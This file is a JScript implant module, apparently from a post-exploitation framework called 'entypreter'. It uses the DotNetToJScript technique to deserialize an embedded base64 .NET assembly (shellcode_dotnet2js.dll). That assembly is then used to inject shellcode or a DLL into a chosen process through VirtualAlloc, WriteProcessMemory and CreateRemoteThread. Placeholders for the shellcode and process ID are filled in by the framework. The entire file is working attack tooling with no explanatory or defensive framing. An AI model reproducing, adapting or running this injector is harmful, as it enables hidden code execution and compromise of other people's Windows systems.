function setversion() {
    var shell = new ActiveXObject('WScript.Shell');
    ver = 'v4.0.30319';
    try {
        shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
    } catch(e) {
        ver = 'v2.0.50727';
    }
    shell.Environment('Process')('COMPLUS_Version') = ver;

}

function debug(s) {}

function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAEikVXQAAAAAA"+
"AAAA4AACIQsBCAAADAAAAAYAAAAAAAA+KwAAACAAAABAAAAAAEAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA8CoA"+
"AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAABECwAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA"+
"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAACArAAAAAAAASAAAAAIABQCUIQAAXAkAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgIoBAAACgAA"+
"ACoAEzAGAGIAAAABAAARAAMoBwAACgp+CAAACgaOaSAAEAAAH0AoAgAABgsGFgcGjmkoCQAACgAS"+
"AhIBKAoAAAoFalgoCwAACgAWDQQoDAAAChMEfggAAAoWCBEEFhIDKAMAAAYTBREFFSgEAAAGJioA"+
"ABswBwCqAAAAAgAAEQAAAygHAAAKCgQoDQAACgsgOgQAABYHbw4AAAooBQAABgwWFv4BEwgrAAh+"+
"CAAACgaOaSAAMAAAGigGAAAGDRYW/gETCCsACAkGBo5pEgQoCAAABhMIEQgtBRcTB95HCAkGjmkf"+
"EBIFKAcAAAYTCBEILQUXEwfeLgh+CAAAChYJfggAAAoWfggAAAooCQAABiYWFv4BEwgrABYTB94I"+
"EwYAGBMH3gAAEQcqAAABEAAAAAABAJ2eAAgLAAABQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcA"+
"AAAABQBsAAAAqAMAACN+AAAUBAAAHAQAACNTdHJpbmdzAAAAADAIAAAIAAAAI1VTADgIAAAQAAAA"+
"I0dVSUQAAABICAAAFAEAACNCbG9iAAAAAAAAAAIAAAFXHQIUCQAAAAD6ATMAFgAAAQAAAAsAAAAC"+
"AAAACQAAAAsAAAAqAAAADgAAAAkAAAADAAAAAgAAAAIAAAAIAAAAAQAAAAIAAAAAAAoAAQAAAAAA"+
"BgA8ADUABgCYAXgBBgC4AXgBBgAJAuoBBgAdAuoBBgDLAuoBBgCKAzUABgCjAzUABgCvA+oBCgDx"+
"A94DBgAPBDUAAAAAAAEAAAAAAAEAAQABABAAIgAAAAUAAQABAFGAQwAKAFGAWQAKAFGAcwAKAFGA"+
"iAAKAFGAmQAKAFGAqQAmAFGAtAAmAFGAwAAmAFGAzwAmAFAgAAAAAIYY4QA4AAEAAAAAAIAAliDn"+
"ADwAAQAAAAAAgACWIPQARAAFAAAAAACAAJEgAQFPAAsAAAAAAIAAliAVAVUADQAAAAAAgACRICEB"+
"XAAQAAAAAACAAJEgMAFlABUAAAAAAIAAkSBBAW8AGgAAAAAAgACRIFQBegAfAFwgAAAAAIYAZwGF"+
"ACYAzCAAAAAAhgBxAYwAKQAAAAEAPQIAAAIARwIAAAMATgIAAAQAXwIAAAEAdgIAAAIAiQIAAAMA"+
"lQIAAAQApAIAAAUAsAICAAYAwAIAAAEA2AIAAAIA4AIAAAEA7wIAAAIA/wIAAAMADgMAAAEAGgMA"+
"AAIAPQIAAAMARwIAAAQATgIAAAUAXwIAAAEAGgMAAAIAPQIAAAMARwIAAAQAIwMCAAUAMAMAAAEA"+
"GgMAAAIAPwMAAAMATQMAAAQAVgMCAAUAXAMAAAEAGgMAAAIAdgIAAAMAiQIAAAQAlQIAAAUApAIA"+
"AAYAsAIAAAcAwAIAAAEAcwMAAAIAfQMAAAMAgwMAAAEA1wMAAAIA2gMRAOEAkgAZAOEAOAAhAOEA"+
"lwAJAOEAOAApAOEAogAxAOEAOAA5AJIDpwBBAKoDrQBJALcDsABBALwDuQBBAOEAvQBJAMQDwgBR"+
"APkD0QBRAAgE1wAIAAQADQAIAAgAEgAIAAwAFwAIABAAHAAIABQAIQAJABgAKQAJABwALgAJACAA"+
"MwAJACQAIQAuAAsA6gAuABMA8wBDABsAnADHANsAMAJpAkABBQDnAAEARgEHAPQAAgBAAQkAAQEB"+
"AAABCwAVAQEAQQENACEBAQBBAQ8AMAEBAEABEQBBAQEAAAETAFQBAQAEgAAAAAAAAAAAAAAAAAAA"+
"AADWAQAAAgAAAAAAAAAAAAAAAQAsAAAAAAACAAAAAAAAAAAAAAABADUAAAAAAAAAADxNb2R1bGU+"+
"AHNoZWxsY29kZV9kb3RuZXQyanMuZGxsAFRlc3RDbGFzcwBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0"+
"AFBST0NFU1NfQ1JFQVRFX1RIUkVBRABQUk9DRVNTX1FVRVJZX0lORk9STUFUSU9OAFBST0NFU1Nf"+
"Vk1fT1BFUkFUSU9OAFBST0NFU1NfVk1fV1JJVEUAUFJPQ0VTU19WTV9SRUFEAE1FTV9DT01NSVQA"+
"TUVNX1JFU0VSVkUAUEFHRV9SRUFEV1JJVEUAUEFHRV9FWEVDVVRFX1JFQUQALmN0b3IAVmlydHVh"+
"bEFsbG9jAENyZWF0ZVRocmVhZABXYWl0Rm9yU2luZ2xlT2JqZWN0AE9wZW5Qcm9jZXNzAFZpcnR1"+
"YWxBbGxvY0V4AFZpcnR1YWxQcm90ZWN0RXgAV3JpdGVQcm9jZXNzTWVtb3J5AENyZWF0ZVJlbW90"+
"ZVRocmVhZABJbmplY3RETEwASW5qZWN0AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMA"+
"Q29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJp"+
"YnV0ZQBzaGVsbGNvZGVfZG90bmV0MmpzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBD"+
"b21WaXNpYmxlQXR0cmlidXRlAERsbEltcG9ydEF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAbHBBZGRy"+
"ZXNzAGR3U2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABLZXJuZWwzMi5kbGwAbHBUaHJl"+
"YWRBdHRyaWJ1dGVzAGR3U3RhY2tTaXplAGxwU3RhcnRBZGRyZXNzAGxwUGFyYW1ldGVyAGR3Q3Jl"+
"YXRpb25GbGFncwBscFRocmVhZElkAE91dEF0dHJpYnV0ZQBoSGFuZGxlAGR3TWlsbGlzZWNvbmRz"+
"AGR3RGVzaXJlZEFjY2VzcwBiSW5oZXJpdEhhbmRsZQBkd1Byb2Nlc3NJZABoUHJvY2VzcwBmbE5l"+
"d1Byb3RlY3QAbHBmbE9sZFByb3RlY3QAbHBCYXNlQWRkcmVzcwBscEJ1ZmZlcgBuU2l6ZQBscE51"+
"bWJlck9mQnl0ZXNXcml0dGVuAGRsbEJhc2U2NABwYXJhbQBvZmZzZXQAQ29udmVydABGcm9tQmFz"+
"ZTY0U3RyaW5nAEludFB0cgBaZXJvAE1hcnNoYWwAQ29weQBUb0ludDY0AFN0cmluZ1RvSEdsb2Jh"+
"bFVuaQBzYwBwaWQAU3lzdGVtLkRpYWdub3N0aWNzAFByb2Nlc3MAR2V0UHJvY2Vzc0J5SWQAZ2V0"+
"X0lkAEV4Y2VwdGlvbgAAAAAAAyAAAAAAAMTnDaaPX+NEt4fst0Rr788ACLd6XFYZNOCJAgYIBAIA"+
"AAAEAAQAAAQIAAAABCAAAAAEEAAAAAIGCQQAEAAABAAgAAAEBAAAAAMgAAEHAAQYGAgJCQoABhgY"+
"CRgYCRAJBQACCRgJBgADGAgCCAgABRgYGAkJCQkABQIYGAkJEBkKAAUCGBgdBQkQGQoABxgYGAkY"+
"GAkYBiADAQ4OCAUgAggOCAQgAQEIBCABAQIFAQABAAAEIAEBDgUAAR0FDgIGGAgABAEdBQgYCAMg"+
"AAoEIAEBCgQAARgOCQcGHQUYGAkYGAUAARIpCAMgAAgOBwkdBRIpGBgZGRItCAIIAQAIAAAAAAAe"+
"AQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBAAAYKwAAAAAAAAAAAAAuKwAAACAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAICsAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAg"+
"QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW"+
"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"+
"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA"+
"RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"+
"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"+
"AAAAADAALgAwAC4AMAAuADAAAABQABgAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHMAaABl"+
"AGwAbABjAG8AZABlAF8AZABvAHQAbgBlAHQAMgBqAHMALgBkAGwAbAAAACgAAgABAEwAZQBnAGEA"+
"bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABgAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu"+
"AGEAbQBlAAAAcwBoAGUAbABsAGMAbwBkAGUAXwBkAG8AdABuAGUAdAAyAGoAcwAuAGQAbABsAAAA"+
"NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB"+
"AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAEA7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
    setversion();
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList');
    var d = fmt.Deserialize_2(stm);
    al.Add(undefined);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

    var lpParam = "~DLLCOMMANDS~";
    var sc = ~SC_B64~;
    var pid = ~PID~;
    if (pid == 0)
    {
        o.InjectDLL(sc, lpParam, ~DLLOFFSET~);
        entypreter.work.report("Done");
    }
    else
    {
        var res = o.Inject(sc, pid);
        if (res == 0)
            entypreter.work.report("Done");
        else
            entypreter.work.error("Error");
    }
} catch (e) {
    entypreter.work.error(e);
}

entypreter.exit();
